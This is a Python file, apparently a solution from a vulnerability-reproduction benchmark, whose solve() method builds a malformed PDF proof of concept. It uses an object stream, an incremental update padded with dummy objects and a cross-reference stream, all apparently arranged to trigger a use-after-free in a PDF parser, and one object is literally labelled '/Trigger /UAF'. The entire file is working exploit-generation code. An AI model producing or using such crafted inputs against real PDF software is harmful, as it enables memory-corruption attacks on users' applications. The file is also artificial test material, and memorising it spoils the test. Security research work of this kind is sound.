import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc_part1 = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"
        
        main_offsets = {}
        
        main_offsets[1] = len(poc_part1)
        poc_part1 += self._build_dict_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
        
        main_offsets[2] = len(poc_part1)
        poc_part1 += self._build_dict_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")

        obj_5_content = b"<< /Trigger /UAF >>"
        stream_header = b"5 0 "
        obj_4_stream_uncompressed = stream_header + obj_5_content
        obj_4_stream_compressed = zlib.compress(obj_4_stream_uncompressed)
        
        main_offsets[4] = len(poc_part1)
        obj_4_dict = (
            f"<< /Type /ObjStm /N 1 /First {len(stream_header)} "
            f"/Filter /FlateDecode /Length {len(obj_4_stream_compressed)} >> stream\n"
        ).encode('ascii')
        poc_part1 += b"4 0 obj\n" + obj_4_dict + obj_4_stream_compressed + b"\nendstream\nendobj\n"
        
        xref1_offset = len(poc_part1)
        xref1_str = (
            "xref\n0 5\n"
            "0000000000 65535 f \n"
            f"{main_offsets[1]:010d} 00000 n \n"
            f"{main_offsets[2]:010d} 00000 n \n"
            "0000000000 00000 f \n"
            f"{main_offsets[4]:010d} 00000 n \n"
        )
        poc_part1 += xref1_str.encode('ascii')

        trailer1_str = (
            f"trailer\n<< /Size 5 /Root 1 0 R >>\n"
            f"startxref\n{xref1_offset}\n%%EOF\n"
        )
        poc_part1 += trailer1_str.encode('ascii')

        poc_part2 = b""
        update_offsets = {}
        
        update_offsets[3] = len(poc_part1) + len(poc_part2)
        poc_part2 += self._build_dict_obj(3, b"<< /Type /Page /Parent 2 0 R /Contents 5 0 R >>")
        
        DUMMY_OBJ_START = 6
        DUMMY_OBJ_END = 40
        for i in range(DUMMY_OBJ_START, DUMMY_OBJ_END):
            update_offsets[i] = len(poc_part1) + len(poc_part2)
            poc_part2 += self._build_dict_obj(i, f"<< /Dummy {i} >>".encode('ascii'))
            
        XREF_STREAM_OBJ_NUM = DUMMY_OBJ_END
        update_offsets[XREF_STREAM_OBJ_NUM] = len(poc_part1) + len(poc_part2)
        
        W = [1, 4, 2]
        
        entry_3 = b'\x01' + update_offsets[3].to_bytes(4, 'big') + (0).to_bytes(2, 'big')
        entry_5 = b'\x02' + (4).to_bytes(4, 'big') + (0).to_bytes(2, 'big')
        dummy_entries = b"".join(
            b'\x01' + update_offsets[i].to_bytes(4, 'big') + (0).to_bytes(2, 'big')
            for i in range(DUMMY_OBJ_START, DUMMY_OBJ_END)
        )
        entry_xref = b'\x01' + update_offsets[XREF_STREAM_OBJ_NUM].to_bytes(4, 'big') + (0).to_bytes(2, 'big')

        num_dummies = DUMMY_OBJ_END - DUMMY_OBJ_START
        index_array = f"[ 3 1 5 1 {DUMMY_OBJ_START} {num_dummies} {XREF_STREAM_OBJ_NUM} 1 ]"
        
        xref_stream_content = entry_3 + entry_5 + dummy_entries + entry_xref
        xref_stream_compressed = zlib.compress(xref_stream_content)
        
        obj_xref_stream_dict = (
            f"<< /Type /XRef /Size {XREF_STREAM_OBJ_NUM + 1} "
            f"/W [ {W[0]} {W[1]} {W[2]} ] /Index {index_array} "
            f"/Root 1 0 R /Prev {xref1_offset} /Filter /FlateDecode "
            f"/Length {len(xref_stream_compressed)} >> stream\n"
        ).encode('ascii')
        
        obj_xref_stream = (
            f"{XREF_STREAM_OBJ_NUM} 0 obj\n".encode('ascii') + obj_xref_stream_dict + 
            xref_stream_compressed + b"\nendstream\nendobj\n"
        )
        poc_part2 += obj_xref_stream
        
        final_trailer = (
            f"startxref\n{update_offsets[XREF_STREAM_OBJ_NUM]}\n%%EOF\n"
        ).encode('ascii')
        poc_part2 += final_trailer
        
        return poc_part1 + poc_part2

    def _build_dict_obj(self, num: int, dict_content: bytes) -> bytes:
        return f"{num} 0 obj\n".encode('ascii') + dict_content + b"\nendobj\n"